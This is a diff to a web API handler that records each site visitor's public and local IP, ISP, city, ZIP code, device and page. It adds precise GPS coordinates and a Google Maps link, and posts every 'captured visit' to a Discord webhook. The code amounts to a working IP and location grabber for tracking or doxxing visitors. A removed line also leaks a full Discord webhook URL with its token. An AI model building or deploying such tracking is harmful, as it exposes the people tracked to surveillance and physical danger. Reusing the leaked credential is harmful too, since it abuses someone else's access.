@@ -15,7 +15,7 @@ export default async function handler(req, res) {
     console.error("Erreur géo:", e);
   }
 
-  const { localIp, userAgent, language, screenResolution, referrer, page } = req.body;
+  const { localIp, preciseLocation, userAgent, language, screenResolution, referrer, page } = req.body;
 
   const logEntry = {
     timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
@@ -23,7 +23,8 @@ export default async function handler(req, res) {
     localIp,
     location: `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`,
     isp: geo.isp || 'ISP inconnu',
-    coords: `${geo.lat || '?'}, ${geo.lon || '?'}`,
+    coords: preciseLocation ? `${preciseLocation.lat}, ${preciseLocation.lon}` : `${geo.lat || '?'}, ${geo.lon || '?'}`,
+    isPrecise: !!preciseLocation,
     userAgent,
     language,
     screenResolution,
@@ -34,9 +35,12 @@ export default async function handler(req, res) {
   console.log('NOUVELLE VISITE CAPTURÉE:', JSON.stringify(logEntry, null, 2));
 
   // Envoi vers Discord
-  const webhookUrl = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1511034814160048168/pQTS0_mbTfqLHz9VhiZ3M2f6_xVL8iH-XzIFMNkAATS7Tn_ShSwIgNFDw-5uMXTnw58B';
+  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
   
   if (webhookUrl) {
+    const mapsLink = logEntry.isPrecise ? `\n📍 [Voir sur Google Maps](https://www.google.com/maps/search/?api=1&query=${logEntry.coords})` : "";
+    const locValue = logEntry.isPrecise ? `✅ **GPS PRÉCIS**\n${logEntry.location}\nCoords: ${logEntry.coords}${mapsLink}` : `❌ IP Uniquement\n${logEntry.location}\nCoords: ${logEntry.coords}`;
+
     try {
       await fetch(webhookUrl, {
         method: 'POST',
@@ -44,12 +48,12 @@ export default async function handler(req, res) {
         body: JSON.stringify({
           embeds: [{
             title: "🚀 Nouvelle Visite sur le Site !",
-            color: 0x00ff00,
+            color: logEntry.isPrecise ? 0x00ff00 : 0xff9900,
             fields: [
               { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
               { name: "🌐 IP Publique (WiFi)", value: `\`${publicIp}\``, inline: true },
               { name: "🏠 IP Locale (Appareil)", value: `\`${localIp}\``, inline: true },
-              { name: "📍 Localisation", value: `**${logEntry.location}**\nCoords: ${logEntry.coords}` },
+              { name: "📍 Localisation", value: locValue },
               { name: "📡 Fournisseur (ISP)", value: logEntry.isp },
               { name: "📄 Page", value: logEntry.page },
               { name: "📱 Appareil", value: `\`${userAgent.substring(0, 250)}\`` },
